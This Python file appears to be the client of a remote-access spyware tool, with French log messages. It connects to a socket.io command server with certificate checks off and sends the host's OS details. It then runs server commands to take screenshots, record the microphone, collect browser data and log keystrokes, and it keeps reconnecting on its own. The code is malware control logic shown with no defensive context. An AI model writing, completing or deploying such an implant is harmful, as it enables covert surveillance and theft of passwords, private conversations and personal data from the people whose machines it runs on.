import json
import platform
import time

import socketio

from database_utils import send_browser_data
from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log

sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)


def log_event(message):
    print(message)


@sio.event
def connect():
    log_event("Connection réussie")
    sio.emit('system_info', {'os': platform.system(), 'os_version': platform.version(), 'hostname': platform.node()})


@sio.event
def connect_error(data):
    log_event(f"Connection echouée: {data}")


@sio.event
def disconnect():
    log_event("Connection perdue")


@sio.event
def command(data):
    command = data.get('command')
    params = data.get('params', {})

    if isinstance(params, str):
        try:
            params = json.loads(params)
        except json.JSONDecodeError:
            print("Erreur de décodage JSON pour les paramètres:", params)
            return

    if isinstance(params, dict):
        duration = int(params.get('duration', 10))
    else:
        duration = int(params)

    if command == 'screenshot':
        take_and_send_screenshot(sio)
    elif command == 'microphone':
        record_and_send_audio(duration, sio)
    elif command == 'browserdata':
        send_browser_data(sio)
    elif command == 'keyboard':
        record_and_send_keyboard_log(duration=30, sio=None, start_time=time.time())


def attempt_reconnect():
    while not sio.connected:
        try:
            log_event("Tentative de reconnexion...")
            sio.connect('https://127.0.0.1:5000')
            time.sleep(5)
        except socketio.exceptions.ConnectionError as e:
            log_event("Echec de la reconnexion. Nouvelle tentative dans 5 secondes...")
            time.sleep(5)
